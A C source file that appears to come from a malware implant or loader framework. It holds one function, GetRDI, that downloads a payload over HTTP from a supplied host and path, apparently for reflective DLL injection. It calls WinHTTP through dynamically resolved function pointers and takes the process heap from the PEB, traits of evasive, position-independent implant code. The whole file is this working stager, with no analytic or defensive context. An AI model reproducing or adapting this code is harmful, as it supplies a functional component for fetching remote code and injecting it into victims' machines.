#include <windows.h>
#include <winhttp.h>
#include <Core/TransportHttp.h>

void GetRDI( _In_ LPWSTR Host, _In_ int Port, _In_ LPWSTR Path, _Out_ PBYTE *ByteCodes, _Out_ DWORD *ByteSize) {
    
	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    
	WCHAR wMethodRequest[] = L"GET";
    
    BOOL  bResults     = FALSE;
    DWORD dwSize       = 0x00;
    DWORD dwDownloaded = 0x00;
    BYTE* pTempBuffer  = NULL;

    PVOID Heap = Instance->pTeb->ProcessEnvironmentBlock->ProcessHeap;

    hSession = Instance->Api.pWinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        goto _END;
    }

    hConnect = Instance->Api.pWinHttpConnect(hSession, Host, Port, 0);
    if (!hConnect) {
        goto _END;
    }

    hRequest = Instance->Api.pWinHttpOpenRequest(hConnect, wMethodRequest, Path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        goto _END;
    }

    bResults = Instance->Api.pWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!bResults) {
        goto _END;
    }

    bResults = Instance->Api.pWinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) {
        goto _END;
    }

    DWORD dwContentLength = 0x00;
    DWORD dwSizeSize      = sizeof(DWORD);
    bResults = Instance->Api.pWinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwContentLength, &dwSizeSize, NULL);
    if (!bResults) {
        goto _END;
    }

    pTempBuffer = (BYTE*)Instance->Api.pRtlAllocateHeap(Heap, 0, dwContentLength);
    if (!pTempBuffer) {
        goto _END;
    }

    do {
        bResults = Instance->Api.pWinHttpReadData(hRequest, (LPVOID)(pTempBuffer + dwDownloaded), dwContentLength - dwDownloaded, &dwSize);
        if (bResults) {
            dwDownloaded += dwSize;
        } else {
            Instance->Api.pRtlFreeHeap(Heap, 0, pTempBuffer);
            pTempBuffer = NULL;
            goto _END;
        }
    } while (dwSize > 0 && dwDownloaded < dwContentLength);

    *ByteCodes = pTempBuffer;
    *ByteSize  = dwContentLength;

_END:
    if (hRequest) Instance->Api.pWinHttpCloseHandle(hRequest);
    if (hConnect) Instance->Api.pWinHttpCloseHandle(hConnect);
    if (hSession) Instance->Api.pWinHttpCloseHandle(hSession);
}